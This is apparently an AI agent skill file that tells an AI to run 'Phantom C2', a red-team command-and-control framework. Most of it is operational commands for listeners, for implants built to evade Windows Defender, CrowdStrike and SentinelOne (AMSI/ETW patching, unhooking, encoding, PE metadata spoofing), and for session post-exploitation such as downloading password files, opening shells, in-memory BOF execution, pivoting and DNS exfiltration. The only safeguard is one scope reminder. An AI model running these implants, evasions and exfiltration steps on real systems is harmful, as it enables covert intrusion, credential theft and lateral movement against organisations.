---
name: phantom-c2
description: "Phantom C2 framework skill. Full red team C2 lifecycle: teamserver management, multi-protocol listeners (mTLS/WireGuard/HTTP/DNS), implant generation with AV/EDR evasion, session post-exploitation, BOF execution, pivoting, engagement tracking, and operator audit logging. Use for red team engagements requiring a durable, stealthy C2 infrastructure. Triggers: 'phantom', 'c2', 'beacon', 'implant', 'teamserver', 'phantom c2', 'generate implant', 'c2 listener', 'bof', 'evasion implant'."
version: 1.0.0
phase: ["exploitation"]
category: ["exploitation"]
tools: ["phantom"]
tags: ["c2", "red-team", "implant", "beacon", "evasion", "bof", "post-exploitation", "engagement-management", "lateral-movement", "persistence"]
---

# Phantom C2

You are operating **Phantom C2** for a red team engagement.
Phantom is a cross-platform C2 framework with multi-protocol listeners, advanced AV/EDR evasion, BOF/COFF in-memory execution, and built-in engagement tracking.

> **All activity MUST be within authorized scope. Verify engagement scope before any action.**

---

## Phase 1 — Infrastructure Setup

### 1.1 Start teamserver (background via tmux)

```bash
tmux new-session -d -s phantom-server -x 220 -y 50
tmux send-keys -t phantom-server './phantom-server' Enter

tmux send-keys -t phantom-server '' ''
sleep 3
tmux capture-pane -t phantom-server -p | tail -5
```

> OPSEC: Run `phantom-server` from a VPS or redirector, not from the operator machine.

### 1.2 Generate operator config

Inside the server console (via tmux):

```bash
tmux send-keys -t phantom-server 'new-operator --name operator1 --lhost <teamserver-ip>' Enter
sleep 2
tmux capture-pane -t phantom-server -p | tail -10

```

### 1.3 Connect phantom-client

```bash
tmux new-window -t phantom-server -n client
tmux send-keys -t phantom-server:client './phantom-client' Enter
sleep 2
tmux capture-pane -t phantom-server:client -p | tail -5
```

---

## Phase 2 — Listener Configuration

Choose protocol based on environment and OPSEC requirements.

### mTLS listener (default — strongest auth)

```bash
tmux send-keys -t phantom-server:client 'mtls --lhost <teamserver-ip> --lport 8888' Enter
```

### WireGuard listener (encrypted tunnel, low detection)

```bash
tmux send-keys -t phantom-server:client 'wireguard --lhost <teamserver-ip> --lport 51820' Enter
```

### HTTP/S listener (blend with web traffic)

```bash
tmux send-keys -t phantom-server:client 'http --lhost <teamserver-ip> --lport 443' Enter
```

### DNS listener (exfil-safe, slow — use when all else blocked)

```bash
tmux send-keys -t phantom-server:client 'dns --lhost <c2-domain>' Enter
```

> **Protocol selection matrix:**
> - Corporate environment with egress filtering → HTTP/S or DNS
> - Controlled lab / internal → mTLS
> - Long-haul persistence → WireGuard
> - Data exfil under DLP → DNS

---

## Phase 3 — Implant Generation

### Standard implant (Windows x64 mTLS)

```bash
./phantom-client
generate --mtls <teamserver-ip>:8888 --os windows --arch amd64 --format exe --save /tmp/
```

### Full AV/EDR evasion — recommended for Windows Defender

```bash
generate --mtls <teamserver-ip>:8888 \
  --os windows --arch amd64 \
  --format exe \
  --evasion \
  --obfuscate \
  --save /tmp/
```

### Enterprise EDR bypass (CrowdStrike / SentinelOne)

```bash
generate --mtls <teamserver-ip>:8888 \
  --os windows --arch amd64 \
  --format shellcode \
  --shellcode-encoder shikata-ga-nai \
  --evasion \
  --obfuscate \
  --save /tmp/
```

### PE metadata spoofing (blend implant as legitimate binary)

```bash
generate --mtls <teamserver-ip>:8888 \
  --os windows --arch amd64 \
  --format exe \
  --evasion --obfuscate \
  --spoof-metadata /path/to/donor.exe \
  --save /tmp/
```

### Linux implant

```bash
generate --mtls <teamserver-ip>:8888 \
  --os linux --arch amd64 \
  --format exe \
  --evasion \
  --save /tmp/
```

> **Evasion flag reference:**
> - `--evasion`: AMSI patch + ETW patch + DLL unhooking + sleep obfuscation + indirect syscalls
> - `--obfuscate`: compile-time symbol/string randomisation via garble
> - `--shellcode-encoder shikata-ga-nai`: polymorphic shellcode encoding
> - `--spoof-metadata`: clone PE metadata from legitimate donor binary
> - Per-binary asymmetric keys are always applied — no signature reuse between implants

---

## Phase 4 — Session Management

### List and interact with sessions

```bash
tmux send-keys -t phantom-server:client 'sessions' Enter

tmux send-keys -t phantom-server:client 'use <session-id>' Enter

tmux send-keys -t phantom-server:client 'whoami' Enter
tmux send-keys -t phantom-server:client 'hostname' Enter
tmux send-keys -t phantom-server:client 'ps' Enter
tmux send-keys -t phantom-server:client 'ls C:\Users' Enter
```

### File operations

```bash
tmux send-keys -t phantom-server:client 'download C:\Users\user\Documents\passwords.txt /tmp/' Enter

tmux send-keys -t phantom-server:client 'screenshot' Enter

tmux send-keys -t phantom-server:client 'shell' Enter
```

---

## Phase 5 — BOF / In-Memory Execution

Phantom supports Beacon Object File (BOF/COFF) execution in-memory — no disk touch.

```bash
tmux send-keys -t phantom-server:client 'bof /path/to/file.o' Enter

tmux send-keys -t phantom-server:client 'execute-assembly /path/to/tool.exe -- arg1 arg2' Enter
```

> OPSEC: Always prefer BOF/in-memory execution over uploading executables to disk.

---

## Phase 6 — Pivoting

Phantom supports TCP and Named Pipe pivots through compromised hosts.

```bash
tmux send-keys -t phantom-server:client 'pivot tcp --lhost 0.0.0.0 --lport 9999' Enter

tmux send-keys -t phantom-server:client 'pivot named-pipe --name phantom-pipe' Enter

generate --mtls <pivot-host-ip>:9999 \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion --obfuscate \
  --save /tmp/pivot-implant/
```

> Use pivots to reach network segments not directly accessible from the teamserver.
> Pair with `ligolo-ng` or `chisel` for layer-3 tunnelling when needed.

---

## Phase 7 — Engagement Management

Phantom has built-in engagement tracking — use it instead of external note-keeping.

```bash
tmux send-keys -t phantom-server:client 'engagements create --name "Client ABC Q1 2026" --scope "10.0.0.0/8" --start 2026-01-15' Enter

tmux send-keys -t phantom-server:client 'engagements assign-session <eng-id> <session-id>' Enter

tmux send-keys -t phantom-server:client 'engagements add-finding <eng-id> --title "Domain Admin via Kerberoasting" --severity critical --host dc01.corp.local --evidence "Cracked svc_sql hash in 4 minutes"' Enter

tmux send-keys -t phantom-server:client 'engagements findings <eng-id>' Enter
```

> **Integration with OMOP reasoning layer:**
> After logging a finding in Phantom, call `pentest_hypothesize` to register it as a
> confirmed hypothesis in the OMOP attack model, then `pentest_handoff` to generate
> the manual validation package for the report.

---

## Phase 8 — Operator Audit Log

```bash
tmux send-keys -t phantom-server:client 'audit' Enter

tmux send-keys -t phantom-server:client 'audit --operator operator1' Enter

tmux send-keys -t phantom-server:client 'audit --action engagement' Enter

tmux send-keys -t phantom-server:client 'audit --since 2026-01-15' Enter
```

> Export audit log before engagement close for the executive report.

---

## OPSEC Checklist

Before any action, verify:
- [ ] Target is in authorized scope (`engagements findings <eng-id>` to confirm scope CIDR)
- [ ] Listener is behind a redirector, not the teamserver IP directly
- [ ] Implant generated with `--evasion --obfuscate` for production engagements
- [ ] BOF/in-memory preferred over disk writes
- [ ] Session check-in interval set with jitter to avoid beacon fingerprinting
- [ ] Sleep obfuscation active (`--evasion` flag enables it)
- [ ] Per-binary keys in use (always — Phantom enforces this by default)
- [ ] Audit log reviewed before engagement close

---

## Output

Save to `.omop/red-team/<engagement>/c2/`:
- `phantom-sessions.txt` — Active session list and host info
- `phantom-findings.json` — Exported engagement findings from Phantom
- `phantom-audit.txt` — Operator audit log export
- `implants/` — Generated implant metadata (not the binaries)

## Integration with Red Team Skill Chain

This skill is invoked from the red team chain at multiple points:

| Chain Position | Phantom Role |
|---|---|
| `red-exploit` | Generate initial access implant, establish first session |
| `red-lateral` | TCP/pipe pivots, BOF execution for lateral tools, in-memory .NET |
| `red-persistence` | Redundant listeners, multiple implant profiles, covert channels |

After Phantom sessions are established, continue with `red-lateral` for domain dominance.
